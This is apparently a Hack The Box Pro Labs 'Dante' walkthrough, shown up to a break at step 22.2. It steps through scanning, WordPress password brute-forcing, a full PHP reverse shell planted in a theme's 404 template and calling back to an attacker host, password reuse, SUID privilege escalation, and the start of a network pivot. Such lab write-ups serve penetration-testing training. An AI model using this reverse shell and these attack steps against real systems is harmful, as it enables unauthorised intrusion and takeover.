# Dante

**Platform: HacktheBox Pro Labs**

**OS: Linux/Windows**


## Key Learnings

- Become exposed to Tensorflow and exploiting h5 files
- Use Docker to run python script
- Doing local port forwarding to gain access to internal ports and services
- Become more familiar with enumerating a Linux machine
- Using Backrest commands to read sensitive files
- The hacker mindset of exploiting a backup feature to read the root flag


## **Disclaimer: Potential spoilers below**


## Walkthrough

1. Do a ping sweep of the external network to discover alive hosts

```
$ nmap -sn -T5 --min-rate=1000 -oN external_ping_scan 10.10.110.0/24

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-13 16:35 CST
Nmap scan report for 10.10.110.2
Host is up (0.066s latency).
Nmap scan report for 10.10.110.100
Host is up (0.067s latency).
Nmap done: 256 IP addresses (2 hosts up) scanned in 2.47 seconds
```

Discovered to hosts on the 10.10.110/24 network: .2 and .100

2. Do a full service scan of all ports for the 2 alive hosts

```
$ nmap -sC -sV -T5 --min-rate=1000 -p- -Pn -oN external_service_scan -iL external_hosts 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-13 16:38 CST
Nmap scan report for 10.10.110.2
Host is up.
All 65535 scanned ports on 10.10.110.2 are in ignored states.
Not shown: 65535 filtered tcp ports (no-response)

Nmap scan report for 10.10.110.100
Host is up (0.066s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.12
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV IP 172.16.1.100 is not the same as 10.10.110.100
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 8f:a2:ff:cf:4e:3e:aa:2b:c2:6f:f4:5a:2a:d9:e9:da (RSA)
|   256 07:83:8e:b6:f7:e6:72:e9:65:db:42:fd:ed:d6:93:ee (ECDSA)
|_  256 13:45:c5:ca:db:a6:b4:ae:9c:09:7d:21:cd:9d:74:f4 (ED25519)
65000/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 2 disallowed entries 
|_/wordpress DANTE{Y0u_Cant_G3t_at_m3_br0!}
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 2 IP addresses (2 hosts up) scanned in 126.36 seconds
```
The nmap output shows 1 host that has open ports, 10.10.110.100, which has 2 open ports of interest, FTP on 21 and HTTP on 65000. 

3. We first test FTP. We try to login anonymously, which is successful. We then proceed to enumerate and exfiltrate any files we can get our hands on. We come across a `todo.txt` file that we download to our local machine.

```
$ ftp 10.10.110.100 
Connected to 10.10.110.100.
220 (vsFTPd 3.0.3)
Name (10.10.110.100:root): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||12604|)
ftp: Can't connect to `10.10.110.100:12604': Connection timed out
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-xr-x    4 0        0            4096 Apr 14  2021 Transfer
226 Directory send OK.
ftp> cd Transfer
250 Directory successfully changed.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Apr 14  2021 Incoming
drwxr-xr-x    2 0        0            4096 Aug 04  2020 Outgoing
226 Directory send OK.
ftp> cd Incoming
250 Directory successfully changed.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             310 Aug 04  2020 todo.txt
226 Directory send OK.
ftp> get todo.txt
local: todo.txt remote: todo.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for todo.txt (310 bytes).
100% |*************************************************************************************************|   310       31.28 KiB/s    00:00 ETA
226 Transfer complete.
310 bytes received in 00:00 (3.95 KiB/s)
ftp> cd ../Outgoing
250 Directory successfully changed.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
226 Directory send OK.
ftp> exit
221 Goodbye.
```

4. Before moving on to test port 65000, lets read the contents of the `todo.txt`

```
$ cat todo.txt 
- Finalize Wordpress permission changes - PENDING
- Update links to to utilize DNS Name prior to changing to port 80 - PENDING
- Remove LFI vuln from the other site - PENDING
- Reset James' password to something more secure - PENDING
- Harden the system prior to the Junior Pen Tester assessment - IN PROGRESS
```

5. The nmap scan for port 65000 output tells us about a `/wordpress` directory, and the contents of this file indicate that we are likely dealing with a Wordpress site. 

6. We browse to the URL `http://10.10.110.100:65000/wordpress` and confirm our findings.

<img width="1400" height="1188" alt="image" src="https://github.com/user-attachments/assets/e40b9e96-063f-41cd-ab63-5ee4eae61cc7" />

7. Since we are dealing with a Wordpress website, we run a wpscan on it and enumerate all plugins and users

`wpscan --url http://10.10.110.100:65000/wordpress -e ap,u`

This command gives us the following output:

```
$ wpscan --url http://10.10.110.100:65000/wordpress -e ap 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.110.100:65000/wordpress/ [10.10.110.100]
[+] Started: Sat Dec 13 16:48:34 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://10.10.110.100:65000/wordpress/robots.txt
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.110.100:65000/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.110.100:65000/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Debug Log found: http://10.10.110.100:65000/wordpress/wp-content/debug.log
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | Reference: https://codex.wordpress.org/Debugging_in_WordPress

[+] Upload directory has listing enabled: http://10.10.110.100:65000/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.110.100:65000/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.1 identified (Insecure, released on 2020-04-29).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.110.100:65000/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.4.1</generator>
 |  - http://10.10.110.100:65000/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.1</generator>

[+] WordPress theme in use: twentytwenty
 | Location: http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/
 | Last Updated: 2025-12-03T00:00:00.000Z
 | Readme: http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 3.0
 | Style URL: http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.2
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.2, Match: 'Version: 1.2'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://10.10.110.100:65000/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] james
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sat Dec 13 16:48:40 2025
[+] Requests Done: 33
[+] Cached Requests: 6
[+] Data Sent: 8.986 KB
[+] Data Received: 342.526 KB
[+] Memory used: 274.148 MB
[+] Elapsed time: 00:00:05
```

8. The wpscan didn't find any plugins but it did find user `james`, so we will do a bruteforce attack to get his password. However, before we do, we will create a custom wordlist of passwords using Hashcat rules

```
$ cat custom.rules                          

:
c
so0
c so0
sa@
c sa@
c sa@ so0
$!
$! c
$! so0
$! sa@
$! c so0
$! c sa@
$! so0 sa@
$! c so0 sa@

$ hashcat --force /usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt -r custom.rules --stdout | sort -u > custom_passwords.wordlist
```

9. Now run password bruteforce attack with custom password list
```
$ wpscan --url http://10.10.110.100:65000/wordpress -U james -P custom_passwords.wordlist -t 50
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.110.100:65000/wordpress/ [10.10.110.100]
[+] Started: Sat Dec 13 20:22:15 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://10.10.110.100:65000/wordpress/robots.txt
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.110.100:65000/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.110.100:65000/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Debug Log found: http://10.10.110.100:65000/wordpress/wp-content/debug.log
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | Reference: https://codex.wordpress.org/Debugging_in_WordPress

[+] Upload directory has listing enabled: http://10.10.110.100:65000/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.110.100:65000/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.1 identified (Insecure, released on 2020-04-29).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.110.100:65000/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.4.1</generator>
 |  - http://10.10.110.100:65000/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.1</generator>

[+] WordPress theme in use: twentytwenty
 | Location: http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/
 | Last Updated: 2025-12-03T00:00:00.000Z
 | Readme: http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 3.0
 | Style URL: http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.2
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.2, Match: 'Version: 1.2'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:04 <===============================================================> (137 / 137) 100.00% Time: 00:00:04

[i] Config Backup(s) Identified:

[!] http://10.10.110.100:65000/wordpress/.wp-config.php.swp
 | Found By: Direct Access (Aggressive Detection)

[+] Performing password attack on Wp Login against 1 user/s
Trying james / Pic Time: 00:12:10 <======   > (49261 / 71979) 68.43%  ETA: 00:05:37s Time: 00:12:10 <======   > (49261 / 71979) 68.43%  ETA: 0[SUCCESS] - james / Toyota                                                                                                                    
Trying james / Toyota Time: 00:16:19 <==============================                                  > (65850 / 137829) 47.77%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: james, Password: Toyota

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sat Dec 13 20:38:52 2025
[+] Requests Done: 65989
[+] Cached Requests: 42
[+] Data Sent: 35.523 MB
[+] Data Received: 370.91 MB
[+] Memory used: 285.234 MB
[+] Elapsed time: 00:16:37
```

10. Login using credentials `james:Toyota` and we find we can use the `Theme Editor` feature.

<img width="983" height="873" alt="image" src="https://github.com/user-attachments/assets/2ebf0021-1a04-45a4-b3a2-31f4356a9a31" />

11. On the top right corner, we select the theme `Twenty Seventeen`, click `Select` and edit the `404 Template`. The contents will be modified to the following:

```
<?php

set_time_limit (0);
$VERSION = "1.0";
$ip = '[ATTACKER_IP]';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
        // Fork and have the parent process exit
        $pid = pcntl_fork();

        if ($pid == -1) {
                printit("ERROR: Can't fork");
                exit(1);
        }

        if ($pid) {
                exit(0);  // Parent exits
        }

        // Make the current process a session leader
        // Will only succeed if we forked
        if (posix_setsid() == -1) {
                printit("Error: Can't setsid()");
                exit(1);
        }

        $daemon = 1;
} else {
        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
        printit("$errstr ($errno)");
        exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
        printit("ERROR: Can't spawn shell");
        exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
        // Check for end of TCP connection
        if (feof($sock)) {
                printit("ERROR: Shell connection terminated");
                break;
        }

        // Check for end of STDOUT
        if (feof($pipes[1])) {
                printit("ERROR: Shell process terminated");
                break;
        }

        // Wait until a command is end down $sock, or some
        // command output is available on STDOUT or STDERR
        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

        // If we can read from the TCP socket, send
        // data to process's STDIN
        if (in_array($sock, $read_a)) {
                if ($debug) printit("SOCK READ");
                $input = fread($sock, $chunk_size);
                if ($debug) printit("SOCK: $input");
                fwrite($pipes[0], $input);
        }

        // If we can read from the process's STDOUT
        // send data down tcp connection
        if (in_array($pipes[1], $read_a)) {
                if ($debug) printit("STDOUT READ");
                $input = fread($pipes[1], $chunk_size);
                if ($debug) printit("STDOUT: $input");
                fwrite($sock, $input);
        }

        // If we can read from the process's STDERR
        // send data down tcp connection
        if (in_array($pipes[2], $read_a)) {
                if ($debug) printit("STDERR READ");
                $input = fread($pipes[2], $chunk_size);
                if ($debug) printit("STDERR: $input");
                fwrite($sock, $input);
        }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
        if (!$daemon) {
                print "$string\n";
        }
}

?>
```

12. After updating the file, we will start a netcat listener on port 4444

`nc -lvnp 4444`

13. Then run the 404 template using cURL

`curl http://10.10.110.100:65000/wordpress/wp-content/themes/twentyseventeen/404.php`

And we get the reverse shell!

<img width="938" height="199" alt="image" src="https://github.com/user-attachments/assets/5fe44af7-0c8a-48a5-acf2-d99daa059ab9" />

14. After looking at the `/home` directory, we notice the user `james` is on this machine as well. We check if he reused his Wordpress password for his local account as well using `su`

```
www-data@DANTE-WEB-NIX01:/home/james$ su james
su james                                                                                                                                                    
Password: Toyota                                                                                                                                            
                                                                                                                                                            
james@DANTE-WEB-NIX01:~$ ls                                                                                                                                 
ls                                                                                                                                                          
Desktop    Downloads  Music     Public     Videos                                                                                                           
Documents  flag.txt   Pictures  Templates                                                                                                                   
james@DANTE-WEB-NIX01:~$ cat flag.txt                                                                                                                       
cat flag.txt                                                                                                                                                
DANTE{j4m3s_xxxxxxxxxxxxxxxxxxxx!}
```

We login as james successfully and even get a flag!

15. Now let's do some basic privesc enumeration by transferring over the `linpeas.sh` script. We start a python server on our local machine and use wget to download the script onto WEB-NIX01.

`wget http://[IP]/linpeas.sh`

<img width="621" height="210" alt="image" src="https://github.com/user-attachments/assets/5768eecd-e44e-47de-b12d-82de14a0574b" />

16. We give our user execute permissions over it and run the script.

`chmod u+x linpeas.sh; ./linpeas.sh`

<img width="904" height="253" alt="image" src="https://github.com/user-attachments/assets/8c8543ec-06ba-4c50-8c17-b274605b1b78" />

17. We find the credentials `balthazar:TheJoker12345!`. We switch users to it

<img width="360" height="149" alt="image" src="https://github.com/user-attachments/assets/6b7d8b83-df77-4985-a385-6614b6e89a62" />

18. Let's try running `linpeas.sh` again and see if there are any ways to privesc to root.

<img width="824" height="351" alt="image" src="https://github.com/user-attachments/assets/48dfe571-71c0-419b-ad17-e27371c2028c" />

19. In the output, we discover the `find` command has the SUID bit set and find a way to privesc to root on [GTFOBins](https://gtfobins.github.io/gtfobins/find/)

<img width="840" height="284" alt="image" src="https://github.com/user-attachments/assets/9850b19d-de31-4fb0-aa8d-15435be9d7e5" />

20. We got a root shell and the root flag on WEB-NIX01

<img width="554" height="153" alt="image" src="https://github.com/user-attachments/assets/e34d821c-bc7b-41e2-8084-c229688fd01e" />

21. Doing some network enumeration, we discover the 172.16.1.0/24 internal network

`ip a`

<img width="765" height="217" alt="image" src="https://github.com/user-attachments/assets/020fbeb0-4c79-43b0-b8ae-a031dfc5e80c" />

22. Let's pivot into this internal network using ligolo-ng. This will be done with the following steps:

22.1 Transfer the Linux version of ligolo-ng agent to WEB-NIX01

On local machine, start web server
`python3 -m http.server 80`

On WEB-NIX01, use wget to transfer script over
`wget http://10.10.14.12/agent`



22.2
